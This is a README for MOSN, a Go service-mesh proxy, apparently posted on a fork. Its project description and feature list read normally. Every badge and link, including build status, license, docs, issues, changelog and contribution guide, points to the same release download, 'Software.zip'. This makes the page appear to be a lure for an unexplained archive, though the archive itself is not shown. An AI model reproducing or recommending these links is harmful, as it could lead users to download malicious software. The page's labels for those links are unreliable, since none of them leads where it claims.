# MOSN Project

[![Build Status](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)
[![codecov](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)
[![Go Report Card](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)
![license](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)

MOSN, the short name of Modular Observable Smart Network, is a powerful proxy acting as Service Mesh's data plane like Envoy but written in golang.
MOSN supports Envoy and Istio's APIs and can be integrated with Istio, and we use MOSN instead of Envoy in SOFAMesh.
The initial version of MOSN was jointly contributed by Ant Financial and UC Business Unit of Alibaba, and we look forward to the community to participate in the
follow-up development and build an open source excellent project together.

## [MOSN Introduction](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)

## Features

+ Integrated with Istio
    + Integrated with Istio version 1.0 and V4 API and can be run based on full dynamic resource configuration
+ Packet Forwarding
    + Self-contained network server
    + Support TCP proxy
    + Support TProxy mode
+ Multi-protocol support
    + HTTP/1.1，HTTP/2.0
    + SOFARPC
    + Dubbo(ongoing)
+ Routing support
    + Routing in form of virtual host
    + Routing with headers/url/prefix
    + Routing with host metadata in form of subset
    + Routing retry
+ Cluster Management & Load Balance support
    + Connection pool
    + Circuit Breaker
    + Health Checker
    + Random/RR LoadBalance
    + Subset LoadBalance with host's metadata
+ Observable
    + Network layer data
    + Protocol data
+ TLS support
    + HTTP/1.x on TLS
    + HTTP/2 on TLS
    + SOFARPC on TLS
+ Process management
    + Smooth reload
    + Smooth upgrade
+ Scalable ability
    + Support self-defined private protocol
    + Scalable Network/IO ，stream layer
    
## Quick Start
* [Reference](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)
   
## Docs
* [Catalog](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)

## Community
* [Issues](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)

## Version
* [Changelog](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)

## Contribution
+ [How to contribute the code](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)
+ MOSN is still in its infancy with many capabilities need to be completed, so we welcome everyone to participate in and commit code together.

## Thanks
Thanks to Google, IBM, Lyft for creating the Envoy and Istio system, so that MOSN has a very good reference and we can
quickly land our own ideas.
